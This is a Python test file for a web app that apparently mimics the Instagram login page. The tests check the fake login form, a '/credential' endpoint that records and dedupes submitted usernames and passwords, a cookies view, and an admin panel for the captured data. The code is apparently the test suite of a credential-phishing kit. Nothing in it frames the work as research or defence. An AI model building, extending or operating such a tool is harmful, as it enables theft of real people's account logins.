"""Offline tests — no Instagram network calls."""
import os
import tempfile

os.environ.setdefault("DATA_DIR", tempfile.mkdtemp(prefix="insight-test-"))
os.environ.setdefault("SECRET_KEY", "x" * 48)
os.environ.setdefault("ADMIN_TOKEN", "")

from app_updated import app  # noqa: E402


def make_client():
    app.config.update(TESTING=True)
    return app.test_client()


def test_login_page_renders_without_placeholder():
    r = make_client().get("/")
    assert r.status_code == 200
    body = r.data
    assert b"Instagram" in body
    assert b"__USER__" not in body
    assert b"<!--MSG-->" not in body
    assert b'name="username"' in body
    assert b'name="password"' in body


def test_login_page_sends_security_headers():
    r = make_client().get("/")
    assert r.headers["X-Frame-Options"] == "DENY"
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert "frame-ancestors 'none'" in r.headers["Content-Security-Policy"]


def test_credential_capture_stores_row():
    c = make_client()
    r = c.post("/credential", json={"username": "u1", "password": "p1", "source": "submit"})
    assert r.status_code == 200
    data = r.get_json()
    assert data["ok"] is True
    assert data.get("id")


def test_credential_capture_dedupes_recent_pair():
    c = make_client()
    first = c.post("/credential", json={"username": "dupe", "password": "pw"})
    second = c.post("/credential", json={"username": "dupe", "password": "pw"})
    assert second.get_json().get("duplicate") is True
    assert second.get_json()["id"] == first.get_json()["id"]


def test_credential_capture_ignores_empty_payload():
    r = make_client().post("/credential", json={})
    assert r.status_code == 200
    assert r.get_json()["skipped"] == "empty"


def test_login_without_password_bounces_back():
    r = make_client().post("/login", data={"username": "someone", "password": ""})
    assert r.status_code == 200
    assert b"Please enter your username and password" in r.data
    assert b'value="someone"' in r.data


def test_dashboard_requires_session():
    r = make_client().get("/dashboard")
    assert r.status_code == 302
    assert "/dashboard" not in r.headers["Location"]


def test_api_state_requires_session():
    r = make_client().get("/api/state")
    assert r.status_code == 401


def test_api_unfollow_requires_session():
    r = make_client().post("/api/unfollow", json={"pk": "1", "username": "x"})
    assert r.status_code == 401


def test_cookies_view_returns_nothing_for_fresh_browser():
    r = make_client().get("/cookies")
    assert r.status_code == 200
    assert r.get_json()["ok"] is False


def test_healthz_reports_ok():
    r = make_client().get("/healthz")
    assert r.status_code == 200
    assert r.get_json()["ok"] is True


def test_admin_open_when_token_unset():
    assert make_client().get("/admin").status_code == 200


def test_admin_locked_when_token_set():
    import oauth_app
    oauth_app.ADMIN_TOKEN = "secret-token"
    try:
        c = make_client()
        assert c.get("/admin").status_code == 401
        assert c.get("/admin?token=secret-token").status_code == 200
        assert c.get("/admin").status_code == 200
    finally:
        oauth_app.ADMIN_TOKEN = ""


def test_admin_delete_requires_csrf():
    c = make_client()
    c.get("/admin")
    r = c.post("/admin/delete-all")
    assert r.status_code == 403


def test_404_page():
    r = make_client().get("/nope")
    assert r.status_code == 404
    assert b"page not found" in r.data
